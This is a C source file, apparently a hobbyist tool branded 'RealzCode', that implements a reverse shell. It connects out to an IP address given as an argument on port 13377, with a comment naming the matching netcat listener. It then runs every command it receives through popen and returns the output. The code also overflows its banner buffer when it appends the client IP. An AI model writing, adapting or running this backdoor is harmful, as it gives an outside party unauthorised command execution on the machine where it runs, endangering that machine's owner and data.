#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024
#define IP_LENGTH 16

char we[] = "\
  _____            _      _____          _      \n\
 |  __ \\          | |    / ____|        | |     \n\
 | |__) |___  __ _| |___| |     ___   __| | ___ \n\
 |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\\n\
 | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/\n\
 |_|  \\_\\___|\\__,_|_/___|\\_____\\___/ \\__,_|\\___|\n\
";

int po = 13377; // nc -l -p 13377

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Please provide the IP address as a command-line argument.\n");
        return 1;
    }

    char* ip = argv[1];
    char client_ip[IP_LENGTH];
    struct sockaddr_in server_address;
    int sock = 0;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Socket creation error\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(po);

    if (inet_pton(AF_INET, ip, &(server_address.sin_addr)) <= 0) {
        printf("Invalid address/ Address not supported\n");
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        printf("Connection failed\n");
        return 1;
    }

    printf("%s:%d\n", ip, po);

    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    getsockname(sock, (struct sockaddr*)&client_addr, &client_addr_len);
    inet_ntop(AF_INET, &(client_addr.sin_addr), client_ip, IP_LENGTH);
    sprintf(we + strlen(we), "Client IP: %s\n", client_ip);

    send(sock, we, strlen(we), 0);

    while (1) {
        send(sock, "$ ", strlen("$ "), 0);
        char command[BUFFER_SIZE];
        memset(command, 0, sizeof(command));

        if (recv(sock, command, BUFFER_SIZE, 0) <= 0)
            break;

        command[strcspn(command, "\n")] = 0;

        if (strcmp(command, "exit") == 0)
            break;

        FILE* cmd_output = popen(command, "r");
        char output[BUFFER_SIZE];
        memset(output, 0, sizeof(output));
        fread(output, sizeof(char), sizeof(output) - 1, cmd_output);
        pclose(cmd_output);

        send(sock, output, strlen(output), 0);
    }

    close(sock);

    return 0;
}
